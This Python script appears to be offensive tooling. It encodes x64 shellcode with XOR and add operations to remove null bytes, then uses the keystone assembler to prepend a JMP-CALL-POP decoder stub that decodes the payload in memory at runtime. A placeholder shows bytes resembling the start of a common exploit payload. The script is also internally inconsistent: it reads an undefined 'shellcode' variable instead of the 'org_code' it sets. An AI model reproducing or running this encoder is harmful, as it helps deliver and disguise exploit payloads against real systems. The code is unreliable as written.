#!/usr/bin/python3
from keystone import *

# Payload hex
#org_code = "0xfc,0x48,0x83,0xe4,0xf0"
org_code = "REPLACE_ME"

# Pretty-print original shellcode
print_friendly_original = ',0x'.join(f'{b:02x}' for b in shellcode)
print(f"Original shellcode: 0x{print_friendly_original}")

# Encode shellcode
encoded_shellcode = []
for b in shellcode:
    b ^= 0x55
    b += 0x1
    b ^= 0x11
    encoded_shellcode.append(b & 0xFF)  # Ensure byte stays in range 0–255

# Pretty-print encoded shellcode
print_friendly_encoded = ',0x'.join(f'{b:02x}' for b in encoded_shellcode)
print(f"Encoded shellcode: 0x{print_friendly_encoded}")

# Print encoded shellcode size
#print(f"Size: 0x{len(shellcode):x}")
code_size = f"0x{len(shellcode):x}"
print(code_size)

# Check for null bytes
contains_null = 0 in encoded_shellcode
print("Contains NULL-bytes:", contains_null)
#----------------------------------------------
CODE = f"""
    jmp shellcode

decoder:
    pop rax
    xor rcx, rcx
    mov rdx, 0x{len(shellcode):x}

decoderStub:
    cmp rcx, rdx
    je encodedShellcode
    xor byte ptr [rax], 0x11
    dec byte ptr [rax]
    xor byte ptr [rax], 0x55
    inc rax
    inc rcx
    jmp decoderStub

shellcode:
    call decoder

encodedShellcode:
"""
print('final_shellcode:')
#print_friendly_encoded = [int(h, 16) for h in shellcode.split(',')]
#encoded_shellcode = print_friendly_encoded
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
final_bytes = encoding + encoded_shellcode
#shellcode = ''.join(f'\\x{b:02x}' for b in final_bytes)
shellcode = ','.join(f'0x{b:02x}' for b in final_bytes)
print(shellcode)
